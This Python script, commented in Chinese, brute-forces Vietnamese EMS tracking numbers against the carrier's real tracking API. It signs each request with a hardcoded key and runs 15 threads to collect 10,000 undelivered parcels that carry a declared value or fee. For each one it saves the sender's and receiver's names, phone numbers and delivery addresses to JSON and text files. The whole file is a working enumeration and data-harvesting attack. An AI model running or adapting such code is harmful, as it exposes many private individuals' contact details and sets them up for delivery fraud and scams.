#!/usr/bin/env python3
"""
爬取最新未签收且有价格的运单号
目标：10000个
策略：从最新的数字范围开始倒序爬取
"""
import hashlib
import requests
import json
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

KEY = '34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A'
API_URL = 'https://api-dingdong.ems.com.vn/api/TrackTrace/Lading'

# 全局计数
lock = threading.Lock()
found_count = 0
tested_count = 0
valid_codes = []

def verify_tracking(code):
    """验证并筛选运单"""
    global found_count, tested_count
    
    signature = hashlib.sha256((code.upper() + KEY).encode()).hexdigest().upper()
    payload = {'LadingCode': code, 'Signature': signature}
    
    try:
        r = requests.post(API_URL, json=payload, timeout=5)
        result = r.json()
        
        with lock:
            tested_count += 1
        
        if result.get('Code') == '00':
            data = result.get('Value', {})
            
            # 筛选：未签收 + 有价格
            signed = bool(data.get('SignatureCapture'))
            value = data.get('Value', 0) or 0
            fee = data.get('Fee', 0) or 0
            
            if not signed and (value > 0 or fee > 0):
                with lock:
                    found_count += 1
                
                return {
                    'code': code,
                    'value': value,
                    'fee': fee,
                    'sender': data.get('SenderName', ''),
                    'receiver': data.get('ReceiverName', ''),
                    'receiver_phone': data.get('ReceiverMobile', ''),
                    'sender_phone': data.get('SenderMobile', ''),
                    'receiver_address': data.get('ReceiverAddress', ''),
                }
    except:
        pass
    
    return None

print("=" * 80)
print("🎯 爬取最新未签收且有价格的运单号")
print("=" * 80)
print("\n目标: 10000个")
print("策略: 从最新范围开始倒序爬取")
print()

# 爬取范围（从新到旧）
ranges = [
    ('EA999', 0, 999999),      # EA999000000VN ~ EA999999999VN
    ('EA99', 0, 9999999),      # 更大范围
    ('EA98', 0, 9999999),
    ('EA97', 0, 9999999),
    ('EA96', 0, 9999999),
    ('EA95', 0, 9999999),
    ('EA90', 0, 9999999),
    ('EA85', 0, 9999999),
    ('EA80', 0, 9999999),
    ('EA79', 0, 9999999),
    ('EA78', 0, 9999999),
    ('EA77', 0, 9999999),
    ('EA776', 0, 999999),
    ('EA775', 900000, 999999),  # EA775900000VN ~ EA775999999VN
]

print("📊 爬取范围（从新到旧）:")
for prefix, s, e in ranges[:5]:
    print(f"  {prefix}{s}VN ~ {prefix}{e}VN")
print("  ...")
print()

confirm = input("开始爬取？(y/n): ").strip().lower()
if confirm != 'y':
    print("❌ 已取消")
    exit(0)

print(f"\n🚀 开始爬取...\n")

output_file = 'latest_unsigned_10000.json'
output_txt = 'latest_unsigned_10000.txt'

start_time = time.time()

# 打开文件准备写入
f_json = open(output_file, 'w', encoding='utf-8')
f_txt = open(output_txt, 'w')

f_json.write('[\n')

for prefix, range_start, range_end in ranges:
    if found_count >= 10000:
        break
    
    print(f"🔍 爬取范围: {prefix}*****VN")
    
    # 倒序爬取（从大到小，越新的越前面）
    codes_to_test = [f"{prefix}{i}VN" for i in range(range_end, range_start - 1, -1)]
    
    with ThreadPoolExecutor(max_workers=15) as executor:
        futures = {executor.submit(verify_tracking, code): code for code in codes_to_test}
        
        for future in as_completed(futures):
            if found_count >= 10000:
                # 取消剩余任务
                for f in futures:
                    f.cancel()
                break
            
            result = future.result()
            
            if result:
                valid_codes.append(result)
                
                # 实时写入
                if len(valid_codes) > 1:
                    f_json.write(',\n')
                f_json.write(json.dumps(result, ensure_ascii=False, indent=2))
                f_json.flush()
                
                f_txt.write(result['code'] + '\n')
                f_txt.flush()
                
                print(f"✅ [{found_count:5d}/10000] {result['code']} | "
                      f"价值:{result['value']}đ 运费:{result['fee']}đ | "
                      f"{result['receiver'][:15]}")
            
            # 进度
            if tested_count % 500 == 0:
                elapsed = time.time() - start_time
                speed = tested_count / elapsed * 60
                print(f"  [进度] 测试:{tested_count} | 找到:{found_count} | "
                      f"速度:{speed:.0f}/分 | 有效率:{found_count*100//tested_count if tested_count>0 else 0}%")
    
    if found_count >= 10000:
        break

f_json.write('\n]')
f_json.close()
f_txt.close()

elapsed = time.time() - start_time

print()
print("=" * 80)
print("✅ 完成！")
print("=" * 80)
print(f"⏱️  用时: {elapsed/60:.0f} 分钟")
print(f"📊 测试: {tested_count} 个")
print(f"✅ 找到: {found_count} 个")
print(f"📈 有效率: {found_count*100//tested_count if tested_count>0 else 0}%")
print("=" * 80)

print(f"\n💾 文件:")
print(f"  {output_file} - 完整信息")
print(f"  {output_txt} - 运单号列表")

if found_count < 10000:
    print(f"\n⚠️  只找到 {found_count} 个（未达到目标10000个）")
    print("   可能需要扩大搜索范围或调整筛选条件")
else:
    print(f"\n🎉 成功找到10000个未签收且有价格的运单号！")
